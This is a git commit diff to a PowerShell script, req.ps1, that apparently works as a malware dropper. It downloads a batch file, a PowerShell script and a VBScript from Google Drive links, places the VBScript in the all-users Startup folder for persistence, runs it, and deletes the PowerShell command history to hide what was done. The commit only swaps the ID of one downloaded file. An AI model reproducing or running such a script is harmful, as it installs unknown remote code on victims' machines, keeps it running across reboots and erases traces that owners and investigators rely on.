fcb3eb9742b01f61a256800639c727ff38bb6a74
UNKNOWNHUNTER6969 <98267862+UNKNOWNHUNTER6969@users.noreply.github.com>
2025-07-11 22:02:06 -0700

    Update req.ps1

--- req.ps1
+++ req.ps1
@@ -2,7 +2,7 @@ cd "$env:USERPROFILE"
 Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1bVch_eQP-2QiQllrW5VKCDm0u9p-nJ5I" -OutFile "win64.bat"
 Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1xejGhEY1YxEJNanzlceGfv9SVNdGpDEg" -OutFile "user.ps1"
 cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1GFyhlHfump8_H-SwNXQBrJBLEV3nqcmr" -OutFile "startup.vbs"
+Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1CFXj6nXlHgFJRzJfabJeIBypEQC_elef" -OutFile "startup.vbs"
 Start-Process "wscript.exe" -ArgumentList "startup.vbs"
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 exit
